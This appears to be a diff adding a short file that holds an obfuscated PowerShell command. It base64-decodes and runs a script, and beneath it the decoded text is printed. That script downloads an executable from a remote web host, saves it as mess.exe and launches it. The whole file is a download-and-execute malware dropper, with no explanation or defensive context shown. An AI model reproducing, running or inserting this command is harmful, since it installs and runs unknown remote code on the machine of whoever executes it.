@@ -1,0 +1,7 @@
+iex([sYsTeM.tExt.eNcODiNG]::utF8.GetstrINg([System.COnVerT]::fRoMbASE64strinG('CihOZXctT2JqZWN0IFNZc3RFTS5ORVQud2VCY2xpZW50KS5Eb1duTG9BZGZJTGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vaW1tby5leGUnLCdtZXNzLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ21lc3MuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYstEM.NET.weBclient).DoWnLoAdfILe('http://worldnit.com/immo.exe','mess.exe');Start-Process 'mess.exe'
+
